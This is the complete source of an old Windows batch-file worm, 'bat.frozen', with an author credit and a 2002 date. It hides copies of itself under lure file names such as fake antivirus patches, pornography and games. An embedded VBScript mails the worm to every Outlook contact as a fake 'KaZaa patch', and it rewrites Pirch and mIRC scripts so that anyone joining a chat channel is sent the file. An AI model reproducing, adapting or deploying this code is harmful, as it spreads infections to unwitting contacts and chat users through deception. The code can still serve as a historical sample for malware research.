@echo off
ctty nul
cls
REM bat.frozen
REM by adious [rRlf]
REM writen on 9\11\02
copy %0 c:\frozen.bat
mkdir c:\¶®úµ±«§
copy %0 c:\¶®úµ±«§\kazaa_patch.EXE.bat
copy %0 c:\¶®úµ±«§\football_updates.EXE.bat
copy %0 c:\¶®úµ±«§\teen_girl_pics.ZIP.bat
copy %0 c:\¶®úµ±«§\Flash_patch.EXE.bat
copy %0 c:\¶®úµ±«§\nortanAV_patch.EXE.bat
copy %0 c:\¶®úµ±«§\trend_microAV_patch.EXE.bat
copy %0 c:\¶®úµ±«§\XXXvideos_vol1.AVI.bat
copy %0 c:\¶®úµ±«§\XXXvideos_vol2.AVI.bat
copy %0 c:\¶®úµ±«§\XXXvideos_vol3.AVI.bat
copy %0 c:\¶®úµ±«§\Webpage_hacker_toolz.EXE.bat
copy %0 c:\¶®úµ±«§\lord_of_the_rings.EXE.bat
copy %0 c:\¶®úµ±«§\1000gamez.EXE.bat
attrib +h +s c:\¶®úµ±«§
if exist c:\¶®úµ±«§\kv.vbs goto endmm
echo Dim x > C:\¶®úµ±«§\kv.vbs
echo.on error resume next >> C:\¶®úµ±«§\kv.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\¶®úµ±«§\kv.vbs
echo Set so=CreateObject(fso) >> C:\¶®úµ±«§\kv.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\¶®úµ±«§\kv.vbs
echo Set out=WScript.CreateObject("Outlook.Application") >> C:\¶®úµ±«§\kv.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\¶®úµ±«§\kv.vbs
echo Set a = mapi.AddressLists(1) >> C:\¶®úµ±«§\kv.vbs
echo Set ae=a.AddressEntries >> C:\¶®úµ±«§\kv.vbs
echo For x=1 To ae.Count >> C:\¶®úµ±«§\kv.vbs
echo Set ci=ol.CreateItem(0) >> C:\¶®úµ±«§\kv.vbs
echo Set Mail=ci >> C:\¶®úµ±«§\kv.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\¶®úµ±«§\kv.vbs
echo Mail.Subject="KaZaa patch from hackers" >> C:\¶®úµ±«§\kv.vbs
echo Mail.Body="I have a patch for the kazaa P2P program.It stops hackers from geting sensitive info from your computer." >> C:\¶®úµ±«§\kv.vbs
echo Mail.Attachments.Add("C:\¶®úµ±«§\kazaa_patch.EXE.bat") >> C:\¶®úµ±«§\kv.vbs
echo Mail.Send >> C:\¶®úµ±«§\kv.vbs
echo Next >> C:\¶®úµ±«§\kv.vbs
echo ol.Quit >> C:\¶®úµ±«§\kv.vbs
cscript C:\¶®úµ±«§\kv.vbs
attrib +h c:\¶®úµ±«§\kv.vbs
:endmm
del c:\pirch98\events.ini
echo [Levels]>pirch
echo Enabled=1>>pirch
echo Count=6>>pirch
echo Level1=000-Unknowns>>pirch
echo 000-UnknownsEnabled=1>>pirch
echo Level2=100-Level 100>>pirch
echo 100-Level 100Enabled=1>>pirch
echo Level3=200-Level 200>>pirch
echo 200-Level 200Enabled=1>>pirch
echo Level4=300-Level 300>>pirch
echo 300-Level 300Enabled=1>>pirch
echo Level5=400-Level 400>>pirch
echo 400-Level 400Enabled=1>>pirch
echo Level6=500-Level 500>>pirch
echo 500-Level 500Enabled=1>>pirch
echo.>>pirch
echo [000-Unknowns]>>pirch
echo User1=*!*@*>>pirch
echo UserCount=1>>pirch
echo Event1=ON JOIN:#:/dcc send $nick c:\frozen.bat>>pirch
echo EventCount=1>>pirch
echo.>>pirch
echo [100-Level 100]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [200-Level 200]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [300-Level 300]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [400-Level 400]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [500-Level 500]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
move pirch c:\pirch98\events.ini
del pirch
echo [script]>b.b
echo n0=on 1:JOIN:#:{ >>b.b
echo n1= /if ( nick == $me ) { halt } >>b.b
echo n2= /.dcc send $nick c:\frozen.bat >>b.b
echo n3=} >>b.b
if exist c:\mirc\mirc.ini copy b.b c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy b.b c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy b.b c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy b.b c:\progra~1\mirc32\script.ini
del b.b
:end